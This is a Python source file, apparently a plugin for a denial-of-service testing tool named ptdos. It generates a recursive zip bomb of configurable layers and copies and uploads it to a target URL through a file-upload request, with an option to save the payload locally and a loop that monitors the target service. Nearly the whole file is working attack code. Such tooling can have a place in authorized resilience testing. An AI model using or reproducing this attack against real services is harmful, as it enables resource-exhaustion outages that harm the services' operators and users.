#Workspace - Ondra


"""ptdos extension that adds a zipbomb attack"""
# python3 ptdos.py -a zipbomb -d 5

# own libs
from infrastructure import factory
from misc.pt_zip import make_recurssive_bomb
from monitoring.ptcheckservice import print_error
from misc.pt_http import post_file_upload
# external libs
from dataclasses import dataclass
from ptlibs.ptprinthelper import ptprint,out_ifnot
from time import time, asctime, sleep
from random import randbytes


@dataclass
class ZipBomb:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""

        layers = args["layers"]
        copies = args["copies"]
        d_size = args["dummy-size"]
        output = args["output"]

        ptprint(out_ifnot(f"Expected size: {d_size*(copies**layers)} MB", "INFO", use_json))

        bomb = make_recurssive_bomb(d_size,copies,layers)

        if(output != ""):
            with open(output,"wb") as zip:
                zip.write(bomb)
                ptprint(out_ifnot(f"Saved payload locally to {output}", "INFO", use_json))
        
        if "127.0.0.1" in dst or "localhost" in dst:
            ptprint(out_ifnot("Local mode detected. Skipping HTTP delivery.", "INFO", use_json))
            return

        post_file_upload(dst,str(randbytes(8).hex())+".zip",bomb)

        

        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)
        try:
            while True:
                if time() - att_start_t_epoch >= duration:
                    break #TODO
        except BaseException as err:
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0])

        return
        
        

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"Zip-Bomb attack options": [
                ["-a", "--attack", "<attack>", "Attack name - zipbomb"],
                ["-ds", "--dummy-size", "<dummy-size>", "Size of the first generated file dummy file in MB"],
                ["-l", "--layers", "<layers>", "Ammount of layers in the zipbomb"],
                ["-c", "--copies", "<copies>", "Ammount of archives in one layer"],
                ["-dst", "--destination", "<dst>", "Specify destination URL."],
                ["-o", "--output", "<output>", "Specify output for saving zip-bomb locally"]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""
        parser.add_argument("-ds", "--dummy-size", dest="dummy-size", type=int, default=1) 
        parser.add_argument("-l", "--layers", dest="layers", type=int, default=5)  
        parser.add_argument("-c", "--copies", dest="copies", type=int, default=10)
        parser.add_argument("-o", "--output", dest="output", type=str, default="")  

def register() -> None:
    """Register attack in factory."""
    factory.register("zipbomb", ZipBomb)